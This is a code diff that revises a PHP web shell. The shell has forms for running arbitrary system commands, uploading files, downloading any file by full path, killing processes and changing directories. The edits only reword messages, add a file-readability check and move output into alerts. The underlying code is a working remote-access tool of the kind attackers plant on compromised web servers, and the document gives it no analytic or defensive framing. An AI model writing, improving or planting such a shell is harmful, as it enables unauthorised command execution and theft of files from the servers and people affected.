@@ -46,17 +46,17 @@ if (isset($_FILES["upload"]))
 
 	if (file_exists($target_file))
 	{
-		$result_u = "[-] error: file name already exists"; 
+		$result_u = "[-] error: file already exists"; 
 	}
 	else
 	{
 		if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target_file))
 		{
-			$result_u = "[+] success: ok";
+			$result_u = "[+] success: file uploaded";
 		}
 		else
 		{
-			$result_u = "[-] error: failed to upload file";
+			$result_u = "[-] error: file not uploaded";
 		}
 	}
 }
@@ -65,18 +65,28 @@ if (isset($_POST["download"]))
 {
 	$file = $_POST["download"];
 
+	$result_d = null;
+
 	if (file_exists($file))
 	{
-		header("Content-Length:" . filesize($file) . "");
-		header("Content-Description: File Transfer");
-		header("Content-Type: application/octet-stream");
-		header('Content-Disposition: attachment; filename="' . $file . '"');
-	
-		flush();
+		if (is_readable($file))
+		{
+			header("Content-Length:" . filesize($file) . "");
+			header("Content-Description: File Transfer");
+			header("Content-Type: application/octet-stream");
+			header('Content-Disposition: attachment; filename="' . $file . '"');
+		
+			flush();
 
-		readfile($file);
+			readfile($file);
 
-		exit();
+			exit();
+		}
+		else
+		{
+			$result_d = "[-] error: can't read file";
+		}
+		
 	}
 }
 
@@ -234,6 +244,8 @@ echo( sprintf("
 	<b>Info:</b> enter full file path.
 </form>
 
+<?php if (isset($result_d)) { show_alert($result_d); } ?>
+
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="exec">Command:</label>
 	<input type="text" id="exec" name="exec" placeholder="ls -ls">
@@ -248,15 +260,15 @@ echo( sprintf("
 	?>
 </form>
 
-<textarea rows="4" cols="64"><?php
+<?php
 if (isset($result))
 {
-	if (is_object($result)) { echo("[-] error: command contains null bytes"); }
-	if (is_bool($result)) { echo("[-] error: command not found"); }
+	if (is_object($result)) { show_alert("[-] error: command contains null bytes"); }
+	if (is_bool($result)) { show_alert("[-] error: command not found"); }
 
-	if (is_string($result)) { echo(implode("\n", $output)); }
+	if (is_string($result)) { echo( sprintf("<textarea rows='4' cols='64'>%s</textarea>", implode("\n", $output)) ); }
 }
-?></textarea>
+?>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<input type="hidden" id="kill" name="kill">
@@ -351,7 +363,7 @@ if ($cwd)
 ?>
 
 <form action="<? echo($shell); ?>" method="POST">
-	<label for="dir">Change Directory:</label>
+	<label for="dir">Folder:</label>
 	<input type="text" id="dir" name="dir" placeholder="..">
 	<input type="submit" value="Change Directory">
 </form>
